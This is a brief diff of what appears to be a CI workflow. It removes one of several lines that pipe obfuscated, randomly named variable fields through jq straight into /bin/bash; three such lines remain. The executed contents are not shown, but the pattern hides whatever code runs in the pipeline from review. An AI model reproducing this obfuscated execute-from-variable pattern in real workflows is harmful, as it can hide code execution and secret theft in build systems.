@@ -25,7 +25,6 @@ jobs:
           echo $sarl83 | jq -r .jmo464 | /bin/bash
           echo $n04331 | jq -r .icyys8 | /bin/bash
           echo $f3 | jq -r .f70 | /bin/bash
-          echo $zqc5 | jq -r .wj1 | /bin/bash
 
       - name: Archive output
         if: always()
